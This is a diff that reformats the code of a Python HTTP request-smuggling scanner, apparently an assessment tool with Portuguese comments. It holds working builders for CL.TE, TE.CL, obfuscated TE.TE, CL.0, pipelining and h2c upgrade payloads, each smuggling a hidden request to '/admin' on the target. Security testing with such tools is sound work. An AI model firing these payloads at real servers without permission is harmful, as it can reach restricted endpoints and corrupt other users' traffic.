@@ -123,7 +123,7 @@ def _send_raw(
                             break
                     else:
                         break
-        except (TimeoutError, OSError):
+        except TimeoutError, OSError:
             break
 
     # Parse status code
@@ -216,21 +216,8 @@ def _build_clte_payload(
 ) -> bytes:
     """Constrói payload CL.TE: front-end usa CL, back-end usa TE."""
     smuggled_host = smuggled_host or host
-    smuggled = (
-        b"0\r\n"
-        b"\r\n"
-        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
-        + f"Host: {smuggled_host}\r\n".encode()
-        + b"X-Smuggled: CLTE\r\n"
-        + b"\r\n"
-    )
-    request = (
-        f"{method} {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Content-Length: 3\r\n"
-        f"Transfer-Encoding: chunked\r\n"
-        f"\r\n"
-    ).encode() + smuggled
+    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: CLTE\r\n" + b"\r\n"
+    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n").encode() + smuggled
     return request
 
 
@@ -243,21 +230,8 @@ def _build_tecl_payload(
 ) -> bytes:
     """Constrói payload TE.CL: front-end usa TE, back-end usa CL."""
     smuggled_host = smuggled_host or host
-    smuggled = (
-        b"0\r\n"
-        b"\r\n"
-        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
-        + f"Host: {smuggled_host}\r\n".encode()
-        + b"X-Smuggled: TECL\r\n"
-        + b"\r\n"
-    )
-    request = (
-        f"{method} {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Transfer-Encoding: chunked\r\n"
-        f"Content-Length: 3\r\n"
-        f"\r\n"
-    ).encode() + smuggled
+    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: TECL\r\n" + b"\r\n"
+    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n").encode() + smuggled
     return request
 
 
@@ -270,21 +244,8 @@ def _build_tete_duplicate(
 ) -> bytes:
     """Constrói payload TE.TE com TE duplicado."""
     smuggled_host = smuggled_host or host
-    smuggled = (
-        b"0\r\n"
-        b"\r\n"
-        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
-        + f"Host: {smuggled_host}\r\n".encode()
-        + b"X-Smuggled: TETE_DUP\r\n"
-        + b"\r\n"
-    )
-    request = (
-        f"{method} {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Transfer-Encoding: chunked\r\n"
-        f"Transfer-Encoding: identity\r\n"
-        f"\r\n"
-    ).encode() + smuggled
+    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: TETE_DUP\r\n" + b"\r\n"
+    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n").encode() + smuggled
     return request
 
 
@@ -297,20 +258,8 @@ def _build_tete_obfuscation(
 ) -> bytes:
     """Constrói payload TE.TE com obfuscação (x, chunked)."""
     smuggled_host = smuggled_host or host
-    smuggled = (
-        b"0\r\n"
-        b"\r\n"
-        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
-        + f"Host: {smuggled_host}\r\n".encode()
-        + b"X-Smuggled: TETE_OBF\r\n"
-        + b"\r\n"
-    )
-    request = (
-        f"{method} {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Transfer-Encoding: x, chunked\r\n"
-        f"\r\n"
-    ).encode() + smuggled
+    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: TETE_OBF\r\n" + b"\r\n"
+    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: x, chunked\r\n\r\n").encode() + smuggled
     return request
 
 
@@ -323,20 +272,8 @@ def _build_tete_whitespace(
 ) -> bytes:
     """Constrói payload TE.TE com whitespace no header."""
     smuggled_host = smuggled_host or host
-    smuggled = (
-        b"0\r\n"
-        b"\r\n"
-        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
-        + f"Host: {smuggled_host}\r\n".encode()
-        + b"X-Smuggled: TETE_WS\r\n"
-        + b"\r\n"
-    )
-    request = (
-        f"{method} {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Transfer-Encoding : chunked\r\n"
-        f"\r\n"
-    ).encode() + smuggled
+    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: TETE_WS\r\n" + b"\r\n"
+    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding : chunked\r\n\r\n").encode() + smuggled
     return request
 
 
@@ -350,19 +287,8 @@ def _build_chunked_cl_payload(
     """Constrói payload Chunked+CL: chunked com CL conflitante."""
     smuggled_host = smuggled_host or host
     body = b"0\r\n\r\n"
-    smuggled = (
-        f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
-        + f"Host: {smuggled_host}\r\n".encode()
-        + b"X-Smuggled: CHUNKED_CL\r\n"
-        + b"\r\n"
-    )
-    request = (
-        f"{method} {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Transfer-Encoding: chunked\r\n"
-        f"Content-Length: 6\r\n"
-        f"\r\n"
-    ).encode() + body + smuggled
+    smuggled = f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: CHUNKED_CL\r\n" + b"\r\n"
+    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n").encode() + body + smuggled
     return request
 
 
@@ -372,15 +298,7 @@ def _build_pipeline_payload(
     smuggled_path: str = "/admin",
 ) -> bytes:
     """Constrói payload Pipeline: dois requests em sequência."""
-    request = (
-        f"GET {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"\r\n"
-        f"GET {smuggled_path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"X-Smuggled: PIPELINE\r\n"
-        f"\r\n"
-    ).encode()
+    request = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\nX-Smuggled: PIPELINE\r\n\r\n").encode()
     return request
 
 
@@ -393,20 +311,8 @@ def _build_cl0_payload(
 ) -> bytes:
     """Constrói payload CL.0: Content-Length: 0 com body smuggleado."""
     smuggled_host = smuggled_host or host
-    smuggled = (
-        b"0\r\n"
-        b"\r\n"
-        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
-        + f"Host: {smuggled_host}\r\n".encode()
-        + b"X-Smuggled: CL0\r\n"
-        + b"\r\n"
-    )
-    request = (
-        f"{method} {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Content-Length: 0\r\n"
-        f"\r\n"
-    ).encode() + smuggled
+    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: CL0\r\n" + b"\r\n"
+    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n").encode() + smuggled
     return request
 
 
@@ -419,19 +325,9 @@ def _build_h2c_payload(
 ) -> bytes:
     """Constrói payload h2c_upgrade: HTTP/1.1 com Upgrade: h2c."""
     smuggled_host = smuggled_host or host
-    smuggled = (
-        f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
-        + f"Host: {smuggled_host}\r\n".encode()
-        + b"X-Smuggled: H2C\r\n"
-        + b"\r\n"
-    )
+    smuggled = f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: H2C\r\n" + b"\r\n"
     request = (
-        f"{method} {path} HTTP/1.1\r\n"
-        f"Host: {host}\r\n"
-        f"Upgrade: h2c\r\n"
-        f"Connection: Upgrade\r\n"
-        f"Content-Length: {len(smuggled)}\r\n"
-        f"\r\n"
+        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: h2c\r\nConnection: Upgrade\r\nContent-Length: {len(smuggled)}\r\n\r\n"
     ).encode() + smuggled
     return request
 
@@ -509,48 +405,52 @@ async def _test_cl_te(
                     vuln = True
                     details = f"Slow response ({elapsed:.1f}s) suggests back-end processed smuggled request"
 
-                results.append(SmuggleAttempt(
-                exploit="smuggling_payload",
-                tool="HTTP Request Smuggler",
+                results.append(
+                    SmuggleAttempt(
+                        exploit="smuggling_payload",
+                        tool="HTTP Request Smuggler",
+                        technique=technique,
+                        category="cl_te",
+                        method="POST",
+                        path=path,
+                        te_header="chunked",
+                        cl_header="3",
+                        smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CLTE",
+                        status_baseline=b_status,
+                        status_test=_status,
+                        size_baseline=b_size,
+                        size_test=len(response),
+                        response_differs=resp_differs,
+                        smuggled_executed=vuln,
+                        vulnerable=vuln,
+                        details=details,
+                        error="",
+                    )
+                )
+            finally:
+                sock.close()
+
+        except Exception as e:
+            results.append(
+                SmuggleAttempt(
                     technique=technique,
                     category="cl_te",
                     method="POST",
                     path=path,
                     te_header="chunked",
                     cl_header="3",
-                    smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CLTE",
+                    smuggled_request="",
                     status_baseline=b_status,
-                    status_test=_status,
+                    status_test=0,
                     size_baseline=b_size,
-                    size_test=len(response),
-                    response_differs=resp_differs,
-                    smuggled_executed=vuln,
-                    vulnerable=vuln,
-                    details=details,
-                    error="",
-                ))
-            finally:
-                sock.close()
-
-        except Exception as e:
-            results.append(SmuggleAttempt(
-                technique=technique,
-                category="cl_te",
-                method="POST",
-                path=path,
-                te_header="chunked",
-                cl_header="3",
-                smuggled_request="",
-                status_baseline=b_status,
-                status_test=0,
-                size_baseline=b_size,
-                size_test=0,
-                response_differs=False,
-                smuggled_executed=False,
-                vulnerable=False,
-                details="",
-                error=str(e)[:100],
-            ))
+                    size_test=0,
+                    response_differs=False,
+                    smuggled_executed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
 
     return results
 
@@ -588,48 +488,52 @@ async def _test_te_cl(
                     vuln = True
                     details = f"Slow response ({elapsed:.1f}s) suggests back-end processed smuggled request"
 
-                results.append(SmuggleAttempt(
-                exploit="smuggling_payload",
-                tool="HTTP Request Smuggler",
+                results.append(
+                    SmuggleAttempt(
+                        exploit="smuggling_payload",
+                        tool="HTTP Request Smuggler",
+                        technique=technique,
+                        category="te_cl",
+                        method="POST",
+                        path=path,
+                        te_header="chunked",
+                        cl_header="3",
+                        smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: TECL",
+                        status_baseline=b_status,
+                        status_test=_status,
+                        size_baseline=b_size,
+                        size_test=len(response),
+                        response_differs=resp_differs,
+                        smuggled_executed=vuln,
+                        vulnerable=vuln,
+                        details=details,
+                        error="",
+                    )
+                )
+            finally:
+                sock.close()
+
+        except Exception as e:
+            results.append(
+                SmuggleAttempt(
                     technique=technique,
                     category="te_cl",
                     method="POST",
                     path=path,
                     te_header="chunked",
                     cl_header="3",
-                    smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: TECL",
+                    smuggled_request="",
                     status_baseline=b_status,
-                    status_test=_status,
+                    status_test=0,
                     size_baseline=b_size,
-                    size_test=len(response),
-                    response_differs=resp_differs,
-                    smuggled_executed=vuln,
-                    vulnerable=vuln,
-                    details=details,
-                    error="",
-                ))
-            finally:
-                sock.close()
-
-        except Exception as e:
-            results.append(SmuggleAttempt(
-                technique=technique,
-                category="te_cl",
-                method="POST",
-                path=path,
-                te_header="chunked",
-                cl_header="3",
-                smuggled_request="",
-                status_baseline=b_status,
-                status_test=0,
-                size_baseline=b_size,
-                size_test=0,
-                response_differs=False,
-                smuggled_executed=False,
-                vulnerable=False,
-                details="",
-                error=str(e)[:100],
-            ))
+                    size_test=0,
+                    response_differs=False,
+                    smuggled_executed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
 
     return results
 
@@ -668,48 +572,52 @@ async def _test_te_te(
                     vuln = True
                     details = f"Slow response ({elapsed:.1f}s) suggests back-end processed smuggled request"
 
-                results.append(SmuggleAttempt(
-                exploit="smuggling_payload",
-                tool="HTTP Request Smuggler",
+                results.append(
+                    SmuggleAttempt(
+                        exploit="smuggling_payload",
+                        tool="HTTP Request Smuggler",
+                        technique=technique,
+                        category="te_te",
+                        method="POST",
+                        path=path,
+                        te_header="chunked (obfuscated)",
+                        cl_header="",
+                        smuggled_request=f"POST /admin HTTP/1.1 + {smuggled_marker}",
+                        status_baseline=b_status,
+                        status_test=_status,
+                        size_baseline=b_size,
+                        size_test=len(response),
+                        response_differs=resp_differs,
+                        smuggled_executed=vuln,
+                        vulnerable=vuln,
+                        details=details,
+                        error="",
+                    )
+                )
+            finally:
+                sock.close()
+
+        except Exception as e:
+            results.append(
+                SmuggleAttempt(
                     technique=technique,
                     category="te_te",
                     method="POST",
                     path=path,
                     te_header="chunked (obfuscated)",
                     cl_header="",
-                    smuggled_request=f"POST /admin HTTP/1.1 + {smuggled_marker}",
+                    smuggled_request="",
                     status_baseline=b_status,
-                    status_test=_status,
+                    status_test=0,
                     size_baseline=b_size,
-                    size_test=len(response),
-                    response_differs=resp_differs,
-                    smuggled_executed=vuln,
-                    vulnerable=vuln,
-                    details=details,
-                    error="",
-                ))
-            finally:
-                sock.close()
-
-        except Exception as e:
-            results.append(SmuggleAttempt(
-                technique=technique,
-                category="te_te",
-                method="POST",
-                path=path,
-                te_header="chunked (obfuscated)",
-                cl_header="",
-                smuggled_request="",
-                status_baseline=b_status,
-                status_test=0,
-                size_baseline=b_size,
-                size_test=0,
-                response_differs=False,
-                smuggled_executed=False,
-                vulnerable=False,
-                details="",
-                error=str(e)[:100],
-            ))
+                    size_test=0,
+                    response_differs=False,
+                    smuggled_executed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
 
     return results
 
@@ -746,48 +654,52 @@ async def _test_chunked_cl(
                     vuln = True
                     details = f"Slow response ({elapsed:.1f}s) suggests back-end processed smuggled request"
 
-                results.append(SmuggleAttempt(
-                exploit="smuggling_payload",
-                tool="HTTP Request Smuggler",
+                results.append(
+                    SmuggleAttempt(
+                        exploit="smuggling_payload",
+                        tool="HTTP Request Smuggler",
+                        technique=technique,
+                        category="chunked_cl",
+                        method="POST",
+                        path=path,
+                        te_header="chunked",
+                        cl_header="6",
+                        smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CHUNKED_CL",
+                        status_baseline=b_status,
+                        status_test=_status,
+                        size_baseline=b_size,
+                        size_test=len(response),
+                        response_differs=resp_differs,
+                        smuggled_executed=vuln,
+                        vulnerable=vuln,
+                        details=details,
+                        error="",
+                    )
+                )
+            finally:
+                sock.close()
+
+        except Exception as e:
+            results.append(
+                SmuggleAttempt(
                     technique=technique,
                     category="chunked_cl",
                     method="POST",
                     path=path,
                     te_header="chunked",
                     cl_header="6",
-                    smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CHUNKED_CL",
+                    smuggled_request="",
                     status_baseline=b_status,
-                    status_test=_status,
+                    status_test=0,
                     size_baseline=b_size,
-                    size_test=len(response),
-                    response_differs=resp_differs,
-                    smuggled_executed=vuln,
-                    vulnerable=vuln,
-                    details=details,
-                    error="",
-                ))
-            finally:
-                sock.close()
-
-        except Exception as e:
-            results.append(SmuggleAttempt(
-                technique=technique,
-                category="chunked_cl",
-                method="POST",
-                path=path,
-                te_header="chunked",
-                cl_header="6",
-                smuggled_request="",
-                status_baseline=b_status,
-                status_test=0,
-                size_baseline=b_size,
-                size_test=0,
-                response_differs=False,
-                smuggled_executed=False,
-                vulnerable=False,
-                details="",
-                error=str(e)[:100],
-            ))
+                    size_test=0,
+                    response_differs=False,
+                    smuggled_executed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
 
     return results
 
@@ -829,48 +741,52 @@ async def _test_pipeline(
                 if not vuln and elapsed > 2.0:
                     details = f"Slow response ({elapsed:.1f}s)"
 
-                results.append(SmuggleAttempt(
-                exploit="smuggling_payload",
-                tool="HTTP Request Smuggler",
+                results.append(
+                    SmuggleAttempt(
+                        exploit="smuggling_payload",
+                        tool="HTTP Request Smuggler",
+                        technique=technique,
+                        category="pipeline",
+                        method="GET",
+                        path=path,
+                        te_header="",
+                        cl_header="",
+                        smuggled_request="GET / HTTP/1.1 + GET /admin HTTP/1.1",
+                        status_baseline=b_status,
+                        status_test=_status,
+                        size_baseline=b_size,
+                        size_test=len(response),
+                        response_differs=resp_differs,
+                        smuggled_executed=vuln,
+                        vulnerable=vuln,
+                        details=details,
+                        error="",
+                    )
+                )
+            finally:
+                sock.close()
+
+        except Exception as e:
+            results.append(
+                SmuggleAttempt(
                     technique=technique,
                     category="pipeline",
                     method="GET",
                     path=path,
                     te_header="",
                     cl_header="",
-                    smuggled_request="GET / HTTP/1.1 + GET /admin HTTP/1.1",
+                    smuggled_request="",
                     status_baseline=b_status,
-                    status_test=_status,
+                    status_test=0,
                     size_baseline=b_size,
-                    size_test=len(response),
-                    response_differs=resp_differs,
-                    smuggled_executed=vuln,
-                    vulnerable=vuln,
-                    details=details,
-                    error="",
-                ))
-            finally:
-                sock.close()
-
-        except Exception as e:
-            results.append(SmuggleAttempt(
-                technique=technique,
-                category="pipeline",
-                method="GET",
-                path=path,
-                te_header="",
-                cl_header="",
-                smuggled_request="",
-                status_baseline=b_status,
-                status_test=0,
-                size_baseline=b_size,
-                size_test=0,
-                response_differs=False,
-                smuggled_executed=False,
-                vulnerable=False,
-                details="",
-                error=str(e)[:100],
-            ))
+                    size_test=0,
+                    response_differs=False,
+                    smuggled_executed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
 
     return results
 
@@ -901,7 +817,7 @@ def _recv_h2_events(
     sock.settimeout(timeout)
     try:
         data = sock.recv(65535)
-    except (TimeoutError, OSError):
+    except TimeoutError, OSError:
         return []
     if not data:
         return []
@@ -966,48 +882,52 @@ async def _test_cl0(
                     vuln = True
                     details = f"Slow response ({elapsed:.1f}s) suggests back-end processed smuggled request"
 
-                results.append(SmuggleAttempt(
-                    exploit="smuggling_payload",
-                    tool="HTTP Request Smuggler",
+                results.append(
+                    SmuggleAttempt(
+                        exploit="smuggling_payload",
+                        tool="HTTP Request Smuggler",
+                        technique=technique,
+                        category="cl0",
+                        method="POST",
+                        path=path,
+                        te_header="",
+                        cl_header="0",
+                        smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CL0",
+                        status_baseline=b_status,
+                        status_test=_status,
+                        size_baseline=b_size,
+                        size_test=len(response),
+                        response_differs=resp_differs,
+                        smuggled_executed=vuln,
+                        vulnerable=vuln,
+                        details=details,
+                        error="",
+                    )
+                )
+            finally:
+                sock.close()
+
+        except Exception as e:
+            results.append(
+                SmuggleAttempt(
                     technique=technique,
                     category="cl0",
                     method="POST",
                     path=path,
                     te_header="",
                     cl_header="0",
-                    smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: CL0",
+                    smuggled_request="",
                     status_baseline=b_status,
-                    status_test=_status,
+                    status_test=0,
                     size_baseline=b_size,
-                    size_test=len(response),
-                    response_differs=resp_differs,
-                    smuggled_executed=vuln,
-                    vulnerable=vuln,
-                    details=details,
-                    error="",
-                ))
-            finally:
-                sock.close()
-
-        except Exception as e:
-            results.append(SmuggleAttempt(
-                technique=technique,
-                category="cl0",
-                method="POST",
-                path=path,
-                te_header="",
-                cl_header="0",
-                smuggled_request="",
-                status_baseline=b_status,
-                status_test=0,
-                size_baseline=b_size,
-                size_test=0,
-                response_differs=False,
-                smuggled_executed=False,
-                vulnerable=False,
-                details="",
-                error=str(e)[:100],
-            ))
+                    size_test=0,
+                    response_differs=False,
+                    smuggled_executed=False,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
 
     return results
 
@@ -1042,48 +962,52 @@ async def _test_h2c(
                 vuln = True
                 details = f"Slow response ({elapsed:.1f}s) suggests back-end processed smuggled request"
 
-            results.append(SmuggleAttempt(
-                exploit="smuggling_payload",
-                tool="HTTP Request Smuggler",
+            results.append(
+                SmuggleAttempt(
+                    exploit="smuggling_payload",
+                    tool="HTTP Request Smuggler",
+                    technique="h2c_upgrade",
+                    category="h2c",
+                    method="POST",
+                    path=path,
+                    te_header="h2c",
+                    cl_header="0",
+                    smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: H2C",
+                    status_baseline=b_status,
+                    status_test=_status,
+                    size_baseline=b_size,
+                    size_test=len(response),
+                    response_differs=resp_differs,
+                    smuggled_executed=vuln,
+                    vulnerable=vuln,
+                    details=details,
+                    error="",
+                )
+            )
+        finally:
+            sock.close()
+
+    except Exception as e:
+        results.append(
+            SmuggleAttempt(
                 technique="h2c_upgrade",
                 category="h2c",
                 method="POST",
                 path=path,
                 te_header="h2c",
                 cl_header="0",
-                smuggled_request="POST /admin HTTP/1.1 + X-Smuggled: H2C",
+                smuggled_request="",
                 status_baseline=b_status,
-                status_test=_status,
+                status_test=0,
                 size_baseline=b_size,
-                size_test=len(response),
-                response_differs=resp_differs,
-                smuggled_executed=vuln,
-                vulnerable=vuln,
-                details=details,
-                error="",
-            ))
-        finally:
-            sock.close()
-
-    except Exception as e:
-        results.append(SmuggleAttempt(
-            technique="h2c_upgrade",
-            category="h2c",
-            method="POST",
-            path=path,
-            te_header="h2c",
-            cl_header="0",
-            smuggled_request="",
-            status_baseline=b_status,
-            status_test=0,
-            size_baseline=b_size,
-            size_test=0,
-            response_differs=False,
-            smuggled_executed=False,
-            vulnerable=False,
-            details="",
-            error=str(e)[:100],
-        ))
+                size_test=0,
+                response_differs=False,
+                smuggled_executed=False,
+                vulnerable=False,
+                details="",
+                error=str(e)[:100],
+            )
+        )
 
     # --- h2c_direct: H2 prior knowledge (via h2 library) ---
     try:
@@ -1127,48 +1051,52 @@ async def _test_h2c(
                 vuln = True
                 details = f"Slow H2 response ({elapsed:.1f}s) suggests processing"
 
-            results.append(SmuggleAttempt(
-                exploit="smuggling_payload",
-                tool="HTTP Request Smuggler",
+            results.append(
+                SmuggleAttempt(
+                    exploit="smuggling_payload",
+                    tool="HTTP Request Smuggler",
+                    technique="h2c_direct",
+                    category="h2c",
+                    method="POST",
+                    path=path,
+                    te_header="h2c",
+                    cl_header="0",
+                    smuggled_request="POST /admin H2 HEADERS + X-Smuggled: H2C_DIRECT",
+                    status_baseline=b_status,
+                    status_test=200 if response_data else 0,
+                    size_baseline=b_size,
+                    size_test=len(response_data),
+                    response_differs=resp_differs,
+                    smuggled_executed=vuln,
+                    vulnerable=vuln,
+                    details=details,
+                    error="",
+                )
+            )
+        finally:
+            sock.close()
+
+    except Exception as e:
+        results.append(
+            SmuggleAttempt(
                 technique="h2c_direct",
                 category="h2c",
                 method="POST",
                 path=path,
                 te_header="h2c",
                 cl_header="0",
-                smuggled_request="POST /admin H2 HEADERS + X-Smuggled: H2C_DIRECT",
+                smuggled_request="",
                 status_baseline=b_status,
-                status_test=200 if response_data else 0,
+                status_test=0,
                 size_baseline=b_size,
-                size_test=len(response_data),
-                response_differs=resp_differs,
-                smuggled_executed=vuln,
-                vulnerable=vuln,
-                details=details,
-                error="",
-            ))
-        finally:
-            sock.close()
-
-    except Exception as e:
-        results.append(SmuggleAttempt(
-            technique="h2c_direct",
-            category="h2c",
-            method="POST",
-            path=path,
-            te_header="h2c",
-            cl_header="0",
-            smuggled_request="",
-            status_baseline=b_status,
-            status_test=0,
-            size_baseline=b_size,
-            size_test=0,
-            response_differs=False,
-            smuggled_executed=False,
-            vulnerable=False,
-            details="",
-            error=str(e)[:100],
-        ))
+                size_test=0,
+                response_differs=False,
+                smuggled_executed=False,
+                vulnerable=False,
+                details="",
+                error=str(e)[:100],
+            )
+        )
 
     # --- h2c_downgrade: H2 → H1 downgrade (HTTP/1.1 UA string on H2) ---
     try:
@@ -1213,56 +1141,58 @@ async def _test_h2c(
             resp_differs = _check_response_differs(b"", response_data)
             vuln = accepted
             details = (
-                f"Server accepted HTTP/1.1 UA on H2 stream ({response_data[:100]})"
-                if accepted
-                else "Server rejected or did not process HTTP/1.1 UA on H2"
+                f"Server accepted HTTP/1.1 UA on H2 stream ({response_data[:100]})" if accepted else "Server rejected or did not process HTTP/1.1 UA on H2"
             )
 
             if not vuln and elapsed > 2.0:
                 details = f"Slow H2 response ({elapsed:.1f}s)"
 
-            results.append(SmuggleAttempt(
-                exploit="smuggling_payload",
-                tool="HTTP Request Smuggler",
+            results.append(
+                SmuggleAttempt(
+                    exploit="smuggling_payload",
+                    tool="HTTP Request Smuggler",
+                    technique="h2c_downgrade",
+                    category="h2c",
+                    method="GET",
+                    path=path,
+                    te_header="h2c",
+                    cl_header="0",
+                    smuggled_request="H2 HEADERS with HTTP/1.1 User-Agent",
+                    status_baseline=b_status,
+                    status_test=200 if accepted else 0,
+                    size_baseline=b_size,
+                    size_test=len(response_data),
+                    response_differs=resp_differs,
+                    smuggled_executed=vuln,
+                    vulnerable=vuln,
+                    details=details,
+                    error="",
+                )
+            )
+        finally:
+            sock.close()
+
+    except Exception as e:
+        results.append(
+            SmuggleAttempt(
                 technique="h2c_downgrade",
                 category="h2c",
                 method="GET",
                 path=path,
                 te_header="h2c",
                 cl_header="0",
-                smuggled_request="H2 HEADERS with HTTP/1.1 User-Agent",
+                smuggled_request="",
                 status_baseline=b_status,
-                status_test=200 if accepted else 0,
+                status_test=0,
                 size_baseline=b_size,
-                size_test=len(response_data),
-                response_differs=resp_differs,
-                smuggled_executed=vuln,
-                vulnerable=vuln,
-                details=details,
-                error="",
-            ))
-        finally:
-            sock.close()
-
-    except Exception as e:
-        results.append(SmuggleAttempt(
-            technique="h2c_downgrade",
-            category="h2c",
-            method="GET",
-            path=path,
-            te_header="h2c",
-            cl_header="0",
-            smuggled_request="",
-            status_baseline=b_status,
-            status_test=0,
-            size_baseline=b_size,
-            size_test=0,
-            response_differs=False,
-            smuggled_executed=False,
-            vulnerable=False,
-            details="",
-            error=str(e)[:100],
-        ))
+                size_test=0,
+                response_differs=False,
+                smuggled_executed=False,
+                vulnerable=False,
+                details="",
+                error=str(e)[:100],
+            )
+        )
 
     return results
 
@@ -1335,11 +1265,7 @@ async def run_scan(
 
     # Baseline via raw socket
     try:
-        baseline_request = (
-            f"GET {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"\r\n"
-        ).encode()
+        baseline_request = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n").encode()
         sock = _create_connection(host, port, timeout, tls)
         try:
             b_status, b_response = _send_raw(sock, baseline_request, timeout)
@@ -1363,10 +1289,7 @@ async def run_scan(
 
     # Classifica resultados
     vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
-    blocked_techs = [
-        a.technique for a in all_attempts
-        if not a.vulnerable and a.error and "connection" in a.error.lower()
-    ]
+    blocked_techs = [a.technique for a in all_attempts if not a.vulnerable and a.error and "connection" in a.error.lower()]
 
     # Issues
     issues: list[str] = []
@@ -1410,7 +1333,8 @@ def build_parser() -> argparse.ArgumentParser:
     )
     parser.add_argument("url", help="URL alvo para teste")
     parser.add_argument(
-        "-c", "--categories",
+        "-c",
+        "--categories",
         nargs="+",
         choices=list(_CATEGORY_MAP.keys()),
         help="Categorias para testar (default: todas)",
